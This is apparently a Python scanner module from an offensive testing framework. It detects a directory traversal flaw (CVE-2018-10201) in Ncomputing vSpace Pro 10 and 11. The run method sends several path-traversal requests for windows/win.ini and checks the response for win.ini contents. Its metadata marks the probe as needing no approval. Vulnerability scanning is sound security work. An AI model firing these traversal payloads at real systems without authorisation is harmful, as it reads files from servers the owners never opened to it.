#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ncomputing vSpace Pro versions 10 and 11 suffer from a directory traversal vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ncomputing vSPace Pro 10 and 11 - Directory Traversal Detection',
        'description': 'Ncomputing vSpace Pro versions 10 and 11 suffer from a directory traversal vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'ncomputing', 'lfi', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/147303/Ncomputing-vSPace-Pro-10-11-Directory-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-10201',
            'http://www.kwell.net/kwell_blog/?p=5199',
            'https://www.kwell.net/kwell/index.php?option=com_newsfeeds&view=newsfeed&id=15&Itemid=173&lang=es',
            'https://support.ncomputing.com/portal/kb/articles/ncomputing-health-monitor-server-vulnerability-patch',
        ],
        'cve': 'CVE-2018-10201',
    }

    def run(self):
        for path in ('/.../.../.../.../.../.../.../.../.../windows/win.ini', '/...\\...\\...\\...\\...\\...\\...\\...\\...\\windows\\win.ini', '/..../..../..../..../..../..../..../..../..../windows/win.ini', '/....\\....\\....\\....\\....\\....\\....\\....\\....\\windows\\win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('bit app support', 'fonts', 'extensions',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Ncomputing vSPace Pro 10 and 11 - Directory Traversal detected",
                    path=path,
                )
                return True
        return False

